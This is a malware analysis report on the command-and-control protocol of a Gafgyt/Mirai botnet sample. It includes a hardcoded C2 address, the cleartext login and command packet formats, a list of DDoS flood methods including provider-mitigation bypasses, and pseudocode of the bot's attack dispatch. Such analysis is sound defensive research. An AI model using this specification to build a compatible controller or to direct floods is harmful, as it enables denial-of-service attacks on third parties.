# Gafgyt/Mirai Botnet Communication Layer Specification

**Sample:** `deepsorrow` (32-bit ELF, x86)  
**Banner:** `im in deep sorrow.`  
**Analysis Basis:** Static reverse engineering via Ghidra decompilation and disassembly

---

## Table of Contents

1. [Session Establishment](#1-session-establishment)
2. [Cryptography](#2-cryptography)
3. [Main Command Loop](#3-main-command-loop)
4. [ACKs & Keepalives](#4-acks--keepalives)

---

## 1. Session Establishment

### 1.1 Observed Behavior

The malware establishes a persistent TCP connection to a hardcoded C2 server. The connection lifecycle follows this sequence:

1. **Socket Creation:** A non-blocking TCP socket (`AF_INET`, `SOCK_STREAM`, `IPPROTO_IP`) is created.
2. **Socket Configuration:** The socket is configured with `SO_REUSEADDR`, `TCP_NODELAY`, and `SO_SNDBUF`/`SO_RCVBUF` settings.
3. **Connection:** A non-blocking `connect()` is issued to the C2 server. The connection status is tracked via `select()` on the writable fd_set.
4. **Login Sequence:** Once connected, the malware sends a multi-part login message containing:
   - Protocol version identifier
   - Authentication password (from `argv[1]`)
   - Bot capability flag
   - Architecture identifier
5. **Main Loop Entry:** After login, the malware enters the main `select()`-based event loop for command reception.

### 1.2 C2 Server Configuration

| Parameter | Value | Notes |
|-----------|-------|-------|
| **Server IP** | `62.60.159.184` | Hardcoded at `0x0806ce4c` (network byte order: `0xb89f3c3e`) |
| **Server Port** | `18129` (`0x46d1`) | Stored at `0x0806ce4a` in network byte order as `0xd146` |
| **Address Family** | `AF_INET (2)` | IPv4 only |

### 1.3 Single-Instance Control Socket

The malware binds a control socket to enforce single-instance operation:

| Parameter | Value | Notes |
|-----------|-------|-------|
| **Bind Address** | `0.0.0.0` or local IP | Depends on `DAT_080642b0` flag |
| **Bind Port** | `18129` (`0x46d1`) | Same as C2 port; stored as `0xd146` |
| **Socket Type** | `SOCK_STREAM` | TCP with `SO_REUSEADDR` |
| **Purpose** | Detects concurrent instances; incoming connections trigger process group termination |

### 1.4 Login Message Format

The login is transmitted as a sequence of separate `send()` calls. The complete login message structure:

```
+------------------------+------------------------------------------+
| Field                  | Format                                    |
+------------------------+------------------------------------------+
| Protocol Version       | 4 bytes, little-endian: 0x00000001        |
| Password Length        | 1 byte: length of password (0-0x1F)       |
| Password               | N bytes: password string (if len > 0)     |
| Flag Byte              | 1 byte: always 0x03                      |
| Architecture           | 1 byte: 'x' (0x78) for x86              |
+------------------------+------------------------------------------+
```

**Byte-level layout example** (with password "test"):
```
Offset  Value    Description
------  ------   -----------
0x00    0x00     Protocol version (byte 0)
0x01    0x00     Protocol version (byte 1)
0x02    0x00     Protocol version (byte 2)
0x03    0x01     Protocol version (byte 3)
0x04    0x04     Password length (4)
0x05    0x74     't'
0x06    0x65     'e'
0x07    0x73     's'
0x08    0x74     't'
0x09    0x03     Flag byte (always 3)
0x0A    0x78     'x' (architecture identifier for x86)
```

### 1.5 Handshake Logic (Pseudocode)

```
FUNCTION establish_c2_session(password: string, local_ip: uint32):
    // Create socket
    fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    IF fd == -1:
        RETURN FAILURE

    // Configure socket
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, 1)
    setsockopt(fd, SOL_TCP, TCP_NODELAY, 1)
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, 10)     // 0xa
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, 3)       // 0x3

    // Non-blocking connect
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, 1)
    getsockopt(fd, SOL_SOCKET, SO_REUSEPORT)
    flags = fcntl(fd, F_GETFL) | O_NONBLOCK
    fcntl(fd, F_SETFL, flags)

    sockaddr addr = {
        sin_family: AF_INET,
        sin_port: 0x46d1,           // Port 18129 (network byte order)
        sin_addr: 0x3e3c9fb8        // 62.60.159.184 (network byte order)
    }

    connect(fd, addr, sizeof(addr))

    // Wait for connection via select() on writable fd_set
    // When writable:
    //   Get SO_ERROR via getsockopt
    //   If error != 0: connection failed

    // Send login message
    protocol_version = 0x00000001   // 4 bytes at 0x0805f69c
    send(fd, &protocol_version, 4, MSG_NOSIGNAL)

    password_len = strlen(password)
    send(fd, &password_len, 1, MSG_NOSIGNAL)

    IF password_len > 0:
        send(fd, password, password_len, MSG_NOSIGNAL)

    flag = 0x03
    send(fd, &flag, 1, MSG_NOSIGNAL)

    arch = 0x78    // 'x' for x86
    send(fd, &arch, 1, MSG_NOSIGNAL)

    RETURN fd
```

### 1.6 Identity Verification Mechanism

**Verified Fact:** The authentication mechanism is a simple password comparison performed by the C2 server:

- The password is provided at runtime via `argv[1]` when the malware is launched.
- Maximum password length is 31 bytes (0x1F), enforced by the check `strlen(argv[1]) < 0x20`.
- After copying the password into the internal buffer, the original `argv[1]` is zeroed out with `memset(argv[1], 0, len)` to remove it from the process command line visible in `/proc`.
- The password is sent in cleartext as part of the login message (password length byte followed by password bytes).
- No cryptographic challenge-response, token, or dynamic credential mechanism is present.

**Verified Fact:** The flag byte (always `0x03`) and architecture byte (`0x78` for x86) serve as bot capability/fingerprinting information but are not part of the authentication mechanism.

### 1.7 Server Response Handling

**Verified Fact:** After sending the login message, the malware enters the main `select()` loop and begins reading server responses. The response reading logic:

1. Reads 2 bytes into a length header buffer.
2. If the length header is zero, reads another 2 bytes and returns to the main loop (interpreted as a heartbeat acknowledgment).
3. If non-zero, byteswaps the value (network to host order) and validates it does not exceed `0x2000` (8192 bytes). If it exceeds this limit, the connection is closed.
4. Reads the payload data into a buffer at `ESP + 0x14`.
5. Reads another 2-byte length header.
6. If non-zero, byteswaps and reads the second payload into the same buffer (overwriting the first).
7. Processes the final payload through `c2_check_heartbeat()` and `c2_parse_command()`.

**Analytical Hypothesis:** The C2 server's response to a successful login is likely an empty or acknowledgment message (length = 0), after which the server begins sending command packets. The exact server-side authentication response format is not observable from the client binary alone.

### 1.8 Success/Failure Handling

**Connection Failure:**
- If `connect()` fails or `SO_ERROR` indicates an error, the connection is abandoned.
- The malware retries connection using exponential backoff via `c2_backoff_retry()`.

**Backoff Retry Logic:**
```
FUNCTION c2_backoff_retry():
    IF c2_fd != -1:
        close(c2_fd)
    c2_fd = -1
    usleep(backoff_delay)           // Initial: 1 second
    backoff_delay = backoff_delay * 2
    IF backoff_delay > 60:          // 0x3c = 60 seconds
        backoff_delay = 60
    retry_count++
```

**Heartbeat Timeout:**
- A heartbeat counter (`DAT_08068ac4`) increments on each `select()` timeout (approximately every 30 seconds).
- When the counter exceeds `0x77` (119), approximately 30 minutes of no server response, the connection is closed and backoff retry begins.
- On each successful data reception, the counter resets to 0.

---

## 2. Cryptography

### 2.1 Observed Behavior

**Verified Fact:** The C2 communication protocol uses **no encryption or encoding** for network traffic. All data (login credentials, commands, responses) is transmitted in cleartext over TCP.

The only cryptographic-like operation present in the binary is the **string table XOR obfuscation**, which is used internally for protecting string literals at rest in the binary image. This does not affect C2 communication.

### 2.2 String Table Obfuscation (Internal Only)

The malware employs a XOR-based string obfuscation for internal string storage:

**Algorithm:** 4-byte XOR key applied byte-by-byte to each string.

**Key:** `0xDEADBEEF` stored at `DAT_08064438` (little-endian: `0xEF, 0xBE, 0xAD, 0xDE`)

**Implementation:**
```
FUNCTION table_toggle_val(entry_id: uint):
    ptr = string_table[entry_id].pointer
    length = string_table[entry_id].length
    key = 0xDEADBEEF

    FOR i = 0 TO length - 1:
        string[i] = string[i] XOR (key & 0xFF)           // byte 0
        string[i] = string[i] XOR ((key >> 8) & 0xFF)    // byte 1
        string[i] = string[i] XOR ((key >> 16) & 0xFF)   // byte 2
        string[i] = string[i] XOR ((key >> 24) & 0xFF)   // byte 3
```

**Usage:**
- `table_init_strings()`: Initializes all string entries (encrypted at rest).
- `table_retrieve_val(id, &length)`: Returns pointer and length for a string entry.
- `table_toggle_val(id)`: XOR-decrypts or re-encrypts a string (toggle operation).
- `table_lock_val()`: Re-encrypts a string after use.

**Note:** This mechanism is irrelevant to C2 communication protocol specification. It only affects how strings are stored within the binary.

### 2.3 Cryptographic Summary

| Aspect | Value |
|--------|-------|
| **C2 Transport Encryption** | None (cleartext TCP) |
| **Login Credential Encoding** | None (cleartext) |
| **Command Encryption** | None (cleartext) |
| **Response Encryption** | None (cleartext) |
| **Internal String Obfuscation** | XOR with key `0xDEADBEEF` (not used in communication) |

---

## 3. Main Command Loop

### 3.1 Observed Behavior

The main event loop uses `select()` to multiplex between the C2 socket and the single-instance control socket:

```
MAIN_LOOP:
    Clear read/write fd_sets (32 bytes each = 1024 max FDs)

    IF control_fd != -1:
        FD_SET(control_fd, read_set)

    IF c2_fd == -1:
        Create new C2 socket and initiate connect()
        // Connection completion tracked via select() writable

    IF c2_fd != -1:
        IF connection_established:
            FD_SET(c2_fd, write_set)
        ELSE:
            FD_SET(c2_fd, read_set)

    max_fd = max(control_fd, c2_fd) + 1
    timeout = 30 seconds

    result = select(max_fd, read_set, write_set, NULL, &timeout)

    IF result == 0:
        // Timeout - send heartbeat
        send_heartbeat()
        IF heartbeat_counter > 119:
            close(c2_fd)
            c2_backoff_retry()
        GOTO MAIN_LOOP

    // Handle control socket (single-instance)
    IF control_fd readable:
        read from control socket
        kill_child_processes()
        kill(-session_id, SIGKILL)
        exit(0)

    // Handle C2 connection established
    IF c2_fd became writable (pending connect):
        accept local control connection
        Send login message
        GOTO MAIN_LOOP

    // Handle C2 data reception
    IF c2_fd readable:
        recv 2 bytes → length_header
        IF length_header == 0:
            recv 2 bytes → discard
            GOTO MAIN_LOOP
        length = ntohs(length_header)
        IF length > 0x2000:
            close(c2_fd); c2_fd = -1
            GOTO MAIN_LOOP
        recv length bytes → payload_buffer
        recv 2 bytes → second_header
        second_length = ntohs(second_header)
        IF second_length > 0:
            recv second_length bytes → payload_buffer
        IF c2_check_heartbeat(payload_buffer, second_length):
            kill_child_processes()
            GOTO MAIN_LOOP
        c2_parse_command(payload_buffer, second_length)
        GOTO MAIN_LOOP

    // Handle connection errors
    IF recv failed (EAGAIN or EINTR):
        GOTO MAIN_LOOP
    ELSE:
        c2_backoff_retry()
        GOTO MAIN_LOOP
```

### 3.2 Protocol Specification

#### 3.2.1 Command Packet Format

The C2 sends commands in a length-prefixed packet format:

```
+--------+--------+--------+--------+--------+--------+---------+--------+
| Offset | Size   | Field  | Type   | Description                        |
+--------+--------+--------+--------+--------+--------+---------+--------+
| 0      | 2      | Length | uint16 | Payload length (network byte order) |
| 2      | 4      | Command| uint32 | Command ID / method selector         |
| 6      | 1      | Method | uint8  | Attack method ID or control code     |
| 7      | 1      | Targets| uint8  | Number of target entries             |
| 8      | 5*N    | Target | array  | Target entries (N = target count)    |
| ...    | 1      | Options| uint8  | Number of option entries             |
| ...    | var    | Option | array  | Option entries                       |
+--------+--------+--------+--------+--------+--------+---------+--------+
```

**Note:** The actual wire format appears to use a two-section structure where the first section may contain a header or framing information, and the second section contains the command payload. The parsing function processes the second section.

#### 3.2.2 Target Entry Structure (24 bytes / 0x18)

```
+--------+--------+----------------------------------+
| Offset | Size   | Field                            |
+--------+--------+----------------------------------+
| 0      | 4      | sockaddr_in.sin_family (AF_INET) |
| 4      | 2      | sockaddr_in.sin_port (network byte order) |
| 6      | 2      | Padding / netmask upper                |
| 8      | 4      | sockaddr_in.sin_addr (target IP, network byte order) |
| 12     | 4      | Netmask (uint32)                       |
| 16     | 1      | CIDR prefix length                     |
| 17     | 7      | Padding                                |
+--------+--------+----------------------------------+
```

**Simplified interpretation:** Each target entry contains:
- Target IP address (4 bytes, network byte order)
- Target port (2 bytes, network byte order)  
- CIDR/netmask information for IP range targeting

#### 3.2.3 Option Entry Format

Options are variable-length entries with the format:

```
+--------+--------+----------------------------------+
| Offset | Size   | Field                            |
+--------+--------+----------------------------------+
| 0      | 1      | Option ID (uint8)                  |
| 1      | 1      | Value length (uint8)               |
| 2      | N      | Value string (N bytes)             |
+--------+--------+----------------------------------+
```

**Note:** In the parsed internal representation, each option is stored as an 8-byte structure:
```
struct option {
    char *val;      // Pointer to option value string
    char id;        // Option ID byte
};
```

#### 3.2.4 Option ID Definitions

| ID (Hex) | Description | Default Value | Data Type |
|----------|-------------|---------------|-----------|
| `0x00` | Payload size | `0x200` (512) | uint32 |
| `0x01` | Randomize payload | `1` (enabled) | boolean |
| `0x02` | IP TOS/DSCP | `0` | uint8 |
| `0x03` | IP ID | `0xFFFF` (random) | uint16 |
| `0x04` | IP TTL | `0x40` (64) | uint8 |
| `0x05` | DF (Don't Fragment) flag | `0` (UDP) / `1` (TCP) | boolean |
| `0x06` | Source port | `0xFFFF` (random) | uint16 |
| `0x07` | Port range | `0xFFFF` (all ports) | string (comma-separated) |
| `0x0B` | TCP URG flag | `0` | boolean |
| `0x0C` | TCP ACK flag | `1` | boolean |
| `0x0D` | TCP PSH flag | `0` | boolean |
| `0x0E` | TCP RST flag | `0` | boolean |
| `0x0F` | TCP SYN flag | `0` (ACK) / `1` (TCP) | boolean |
| `0x10` | TCP FIN flag | `0` | boolean |
| `0x11` | TCP sequence number | `0xFFFF` (random) | uint32 |
| `0x12` | TCP acknowledgment number | `0xFFFF` (random) | uint32 |
| `0x19` | Source IP (spoofing) | Local IP | IP address string |

#### 3.2.5 Control Command Codes

Control commands use specific method ID values:

| Method Byte (Hex) | Command | Behavior |
|-------------------|---------|----------|
| `0xFF` (-1) | `toggle_attack_flag` | Toggles `DAT_08068ac0` between 0 and 1; controls whether attack commands are processed |
| `0xFE` (-2) | `kill_child_processes` | Terminates all attack child processes and scanner processes |
| `0xFD` (-3) | `kill_child_processes` | Same as `0xFE`; terminates all child processes |

#### 3.2.6 Attack Method ID Registry

The malware dynamically registers attack methods at startup via `attack_init()`:

| ID (Hex) | Function | Attack Type | Description |
|----------|----------|-------------|-------------|
| `0x00` | `attack_udp_plain` | UDP Flood | Raw UDP packet flood with configurable IP/UDP headers |
| `0x01` | `attack_method_raw` | Raw IP Flood | Raw socket flood with fully custom IP headers |
| `0x02` | *(not registered)* | - | - |
| `0x03` | `attack_method_tcp` | TCP Flood | TCP SYN/ACK flood with TCP options |
| `0x04` | `attack_tcp_ack` | TCP ACK Flood | Raw TCP ACK flood with configurable flags |
| `0x05` | `attack_tcp_stomp` | TCP Stomp | Establishes TCP connections then sends custom payloads |
| `0x06` | `attack_method_hexflood` | Hex Flood | UDP flood with hex-decoded payloads |
| `0x07` | `attack_method_stdhex` | Standard Hex Flood | UDP flood with hex payloads via standard sockets |
| `0x08` | *(not registered)* | - | - |
| `0x09` | `attack_method_udphex` | UDP Hex Flood | Fast UDP flood with hex payloads |
| `0x0A` | `attack_method_tcpxmas` | TCP Xmas Flood | TCP packets with FIN+URG+PSH flags |
| `0x0B` | `attack_method_nfo` | NFO Flood | Bypasses NFO game server mitigations |
| `0x0C` | `attack_method_nudp` | NUDP Flood | Non-conforming UDP to bypass firewalls |
| `0x0D` | `attack_tcp_bypass` | TCP Bypass Flood | TCP packets designed to bypass stateful inspection |
| `0x0E` | `attack_method_ovhdrop` | OVH Drop Flood | UDP payloads targeting OVH anti-DDoS weaknesses |
| `0x0F` | `attack_method_ovh` | OVH Bypass Flood | OVH DDoS mitigation bypass |
| `0x10` | `attack_method_std` | Standard UDP Flood | Standard UDP socket flood |
| `0x11` | `attack_method_mysql` | MySQL Flood | MySQL protocol-based flood |
| `0x12` | `attack_method_redis` | Redis Flood | Redis protocol-based flood |
| `0x13` | `attack_method_minecraft` | Minecraft Flood | Minecraft protocol-based flood |
| `0x14` | `attack_method_http` | HTTP Flood | HTTP/1.1 and HTTP/2 flood |
| `0x15` | `attack_method_smtp` | SMTP Flood | SMTP protocol-based flood |
| `0x16` | `attack_method_rdp` | RDP Flood | RDP/T.1251 protocol-based flood |
| `0x17` | `attack_method_openvpn` | OpenVPN Flood | OpenVPN protocol-based flood |
| `0x18` | `attack_method_fivem` | FiveM Flood | FiveM (GTA V) protocol-based flood |
| `0x19` | `attack_method_mongo` | MongoDB Flood | MongoDB protocol-based flood |
| `0x1A` | `attack_method_socks5` | SOCKS5 Flood | SOCKS5 protocol-based flood |

### 3.3 Message Processing Logic (Pseudocode)

```
FUNCTION c2_parse_command(payload: byte[], length: uint32):
    IF length < 3:
        RETURN

    // Extract command ID (4 bytes, little-endian)
    command_id = read_uint32_le(payload, 0)

    // Extract method ID (1 byte at offset 4)
    method_id = payload[4]

    // Handle control commands (no method ID means control)
    IF length == 4:
        // No method byte present - this is a length check edge case
        RETURN

    IF command_id == 0:
        IF method_id == 0xFF:  // -1 signed
            toggle_attack_flag()
            RETURN
        IF method_id == 0xFE OR method_id == 0xFD:  // -2 or -3 signed
            kill_child_processes()
            RETURN

    // Handle attack commands
    IF length < 5:
        RETURN

    // Parse targets
    target_count = payload[5]
    IF target_count == 0:
        RETURN

    offset = 6
    targets = ALLOC(target_count * 24)  // 24 bytes per target entry
    FOR i = 0 TO target_count - 1:
        target.ip = read_uint32(payload, offset)
        target.port = read_uint16_be(payload, offset + 4)
        target.netmask = read_uint32(payload, offset + 8)
        target.cidr = payload[offset + 12]
        targets[i] = target
        offset += 5  // Each target entry is 5 bytes in the wire format

    // Parse options
    option_count = payload[offset]
    options = ALLOC(option_count * 8)  // 8 bytes per option entry
    offset += 1

    FOR i = 0 TO option_count - 1:
        option.id = payload[offset]
        option.val_len = payload[offset + 1]
        option.val = ALLOC(option.val_len + 1)
        COPY(option.val, payload + offset + 2, option.val_len)
        options[i] = option
        offset += 2 + option.val_len

    // Execute attack
    attack_start(command_id, method_id, target_count, targets, option_count, options)

    // Cleanup
    FOR each target in targets:
        FREE(target)
    FREE(targets)
    FOR each option in options:
        FREE(option.val)
    FREE(options)


FUNCTION attack_start(command_id: uint32, method_id: uint8, 
                      target_count: uint32, targets: array,
                      option_count: uint32, options: array):
    IF command_id <= 0:
        RETURN

    // Fork attack supervisor process
    pid = fork()
    IF pid > 0:
        // Parent: record PID and return to main loop
        record_attack_pid(pid)
        RETURN
    IF pid < 0:
        RETURN  // Fork failed

    // Child process: fork timer
    timer_pid = fork()
    IF timer_pid == 0:
        // Timer grandchild
        sleep(command_id)  // Duration from command_id
        kill(getppid(), SIGKILL)  // Kill supervisor
        exit(0)

    // Supervisor: find and execute attack method
    FOR i = 0 TO attack_method_count - 1:
        IF attack_methods[i].id == method_id:
            attack_methods[i].function(target_count, targets, option_count, options)
            BREAK
    exit(0)
```

### 3.4 Attack Execution Model

**Verified Fact:** Attack execution uses a double-fork pattern:

1. **Parent (main daemon):** Forks the attack supervisor, records its PID, and returns to the C2 loop.
2. **Attack Supervisor (child):** Forks a timer process, then enters the infinite attack loop.
3. **Timer (grandchild):** Sleeps for the attack duration (encoded in the command ID field), then sends `SIGKILL` to the supervisor.

**Maximum concurrent attacks:** 8 (stored in `DAT_08068ae0` array of 8 PID slots).

### 3.5 Dynamic Command Registration

**Verified Fact:** Attack methods are registered at startup via `attack_method_register()`. Each registration allocates a structure containing:
- Function pointer (4 bytes)
- Method ID (1 byte)

The registered methods are stored in a dynamically growing array (`DAT_08068ad0`), with the count tracked in `DAT_08068acc`. At startup, 25 methods are registered (IDs 0x00 through 0x1A, with some gaps).

No runtime dynamic registration mechanism is present. The method table is built once during `attack_init()` and never modified.

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The malware implements a simple heartbeat mechanism to maintain the C2 session and detect server liveness.

### 4.2 Heartbeat / Keepalive

**Heartbeat Payload:**
```
Byte 0: 0x00
Byte 1: 0x00
```

**Transmission Interval:**
- The `select()` call has a 30-second timeout.
- On each timeout, a 2-byte heartbeat (`\x00\x00`) is sent.
- The heartbeat counter increments on each timeout.
- When the counter exceeds 119 (approximately 30 minutes), the connection is considered dead and backoff retry begins.

**Heartbeat Handling Logic:**
```
FUNCTION on_select_timeout():
    send(c2_fd, "\x00\x00", 2, MSG_NOSIGNAL)
    heartbeat_counter++
    
    IF heartbeat_counter > 119 AND c2_fd != -1:
        close(c2_fd)
        c2_backoff_retry()
        c2_fd = -1
```

**Server Heartbeat Response:**
**Analytical Hypothesis:** The C2 server responds to the heartbeat with a 2-byte `\x00\x00` message. The client's recv logic interprets a zero-length header as a heartbeat acknowledgment and returns to the main loop without processing further data.

### 4.3 Command ACKs

**Verified Fact:** The malware does **not** send explicit acknowledgment (ACK) messages in response to received commands. Command processing is fire-and-forget:

1. The command is received and parsed.
2. The attack is forked into a child process.
3. The parent daemon returns to the main loop without sending any confirmation.

### 4.4 Status Reporting

**Verified Fact:** The malware does **not** implement any periodic status reporting, telemetry, or execution result feedback mechanism. The only data sent to the C2 server consists of:
1. The login message (sent once per connection)
2. Heartbeat packets (`\x00\x00`, sent on select timeout)

No victim information, attack statistics, bandwidth metrics, or error reports are transmitted to the C2 server.

### 4.5 Session Lifecycle

| State | Trigger | Action |
|-------|---------|--------|
| **Disconnected** | Initial state or connection failure | Create socket, initiate connect, enter backoff if needed |
| **Connecting** | Non-blocking connect issued | Wait for `select()` writable event |
| **Connected** | Connection established | Send login message, enter main loop |
| **Active** | In main loop, receiving commands | Process commands, send heartbeats |
| **Timeout** | Heartbeat counter > 119 | Close connection, enter backoff |
| **Terminated** | Control socket receives connection | Kill all children, exit process |

**Session Recovery:**
- On connection loss (timeout, error, or server disconnect), the malware enters exponential backoff mode.
- Backoff starts at 1 second and doubles on each retry, capped at 60 seconds.
- The backoff delay is stored in `DAT_080642b4` and resets to 1 on each new connection attempt.

### 4.6 Connection Termination

**Graceful Termination:** Not implemented. The malware does not send any disconnect notification to the C2 server.

**Forced Termination via Control Socket:**
When a connection is received on the single-instance control socket (bound to port `0x46d1`):
1. The incoming connection is accepted and immediately closed.
2. `kill_child_processes()` is called to terminate all attack processes.
3. `kill(-session_id, SIGKILL)` terminates the entire process group.
4. The process exits.

This mechanism allows an operator to kill a running bot instance by connecting to its control port.

---

## Appendix A: Protocol Constants Summary

| Constant | Value | Location | Description |
|----------|-------|----------|-------------|
| C2 IP | `62.60.159.184` | `0x0806ce4c` | Hardcoded C2 server address |
| C2 Port | `18129` (`0x46d1`) | `0x0806ce4a` | C2 server port (network byte order) |
| Control Port | `18129` (`0x46d1`) | `table_init()` | Single-instance control socket port |
| Protocol Version | `0x00000001` | `0x0805f69c` | Login protocol version |
| Login Flag | `0x03` | Inline constant | Bot capability flag |
| Architecture | `0x78` ('x') | `0x08061737` | x86 architecture identifier |
| Max Payload Size | `0x2000` (8192) | Inline constant | Maximum accepted command payload |
| Select Timeout | `30` seconds | `0x0804866a` | Main loop select timeout |
| Heartbeat Max | `119` (0x77) | Inline constant | Max heartbeat count before reconnect |
| Backoff Cap | `60` seconds | `0x08048198` | Maximum retry delay |
| Max Attacks | `8` | `DAT_08068ae0` | Maximum concurrent attack processes |
| Password Max | `31` bytes | Inline constant | Maximum C2 password length |
| XOR Key | `0xDEADBEEF` | `0x08064438` | Internal string obfuscation key |

---

## Appendix B: Analysis Gaps

| Gap | Description | Impact |
|-----|-------------|--------|
| **Server Response Format** | The exact format of C2 server responses (especially post-login acknowledgment) cannot be determined from the client binary alone | The login success/failure signal from the server is inferred but not confirmed |
| **Two-Section Packet Structure** | The recv logic reads two length-prefixed sections per packet, but the purpose of the first section is unclear | May indicate a protocol feature not fully captured in this analysis |
| **Command ID Semantics** | The 4-byte command ID field appears to be used for attack duration in `attack_start()`, but its full semantic meaning is not clear | The relationship between command ID and attack behavior needs runtime confirmation |
| **Server-Side Authentication** | How the C2 server validates the password is not observable from the client | Authentication failure handling on the server side is unknown |
| **Heartbeat Response** | The server's response to heartbeat packets is inferred from client logic but not confirmed | The exact heartbeat acknowledgment format is an analytical hypothesis |

---

## Appendix C: Function Address Reference

| Function | Address | Description |
|----------|---------|-------------|
| `main` | `0x0804830c` | Entry point and main event loop |
| `c2_parse_command` | `0x080490fc` | Command parsing and dispatch |
| `c2_check_heartbeat` | `0x08048ce8` | Heartbeat/control command detection |
| `c2_backoff_retry` | `0x08048198` | Connection retry with exponential backoff |
| `c2_find_option` | `0x08048a93` | Option lookup in option array |
| `c2_get_option_val` | `0x08048ba0` | Get option value with default |
| `c2_get_option_ip` | `0x08048b68` | Get IP address option with default |
| `c2_parse_port_range` | `0x08048ad6` | Parse port range option string |
| `attack_start` | `0x08048c1b` | Fork and execute attack |
| `attack_init` | `0x0804935a` | Register all attack methods |
| `attack_method_register` | `0x08049304` | Register a single attack method |
| `toggle_attack_flag` | `0x08048186` | Toggle attack enable/disable flag |
| `kill_child_processes` | `0x08048d16` | Terminate all child processes |
| `table_init` | `0x080481f1` | Initialize string table and control socket |
| `table_init_strings` | `0x08054074` | Initialize string table entries |
| `table_retrieve_val` | `0x08053fa0` | Retrieve string from table |
| `table_toggle_val` | `0x08053fc6` | XOR toggle string encryption |
| `get_local_ip` | `0x0805388d` | Determine local IP via connect to 8.8.8.8 |
| `hex_decode` | `0x0804d3cc` | Decode hex string to bytes |
| `ip_checksum` | `0x080536ae` | Compute IP header checksum |
| `tcp_udp_checksum` | `0x080536ea` | Compute TCP/UDP pseudo-header checksum |
